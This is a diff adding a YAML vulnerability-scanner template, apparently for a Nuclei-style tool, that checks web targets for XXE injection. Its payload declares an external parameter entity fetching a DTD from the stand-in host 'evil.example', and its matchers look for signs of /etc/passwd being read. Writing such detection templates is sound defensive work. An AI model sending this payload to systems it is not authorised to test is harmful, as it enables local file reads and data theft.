@@ -1,0 +1,23 @@
+id: xxe2-083
+name: 'XXE file read in body'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via body'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      body:
+        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "http://evil.example/x.dtd"> %a;]>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
+          - 'localhost'
+          - 'uid='
